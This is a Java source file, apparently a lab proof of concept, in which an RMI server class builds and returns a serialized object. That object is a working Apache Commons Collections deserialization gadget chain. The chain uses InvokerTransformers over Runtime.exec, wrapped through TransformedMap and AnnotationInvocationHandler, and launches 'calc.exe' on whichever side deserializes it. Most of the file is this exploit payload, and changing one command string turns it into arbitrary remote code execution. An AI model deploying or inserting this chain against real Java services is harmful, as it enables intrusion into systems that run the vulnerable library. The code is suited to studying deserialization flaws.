package RMI;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.rmi.RemoteException;
import java.util.HashMap;
import java.util.Map;

public class RemoteHelloImpl implements RemoteHello {
    @Override
    public String sayHello(String name) throws RemoteException {
        System.out.printf("the server say " +name);
        return String.format("Hello, %s!", name);
    }

    @Override
    public String exp1(Object exp) throws RemoteException {
        System.out.println("exp1 is " + exp);
        return "exp1";
    }

    @Override
    public Object exp2() throws Exception {
        System.out.println("exp2");
        return payload();
    }


    public static Object payload() throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map map = new HashMap();
        map.put("value", "lala");
        Map transformedMap = TransformedMap.decorate(map, null, transformerChain);

        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Target.class, transformedMap);
        return instance;
    }

    public static void main(String[] args) throws Exception {
        Object instance =  payload();
        System.out.printf(instance.toString());

    }
}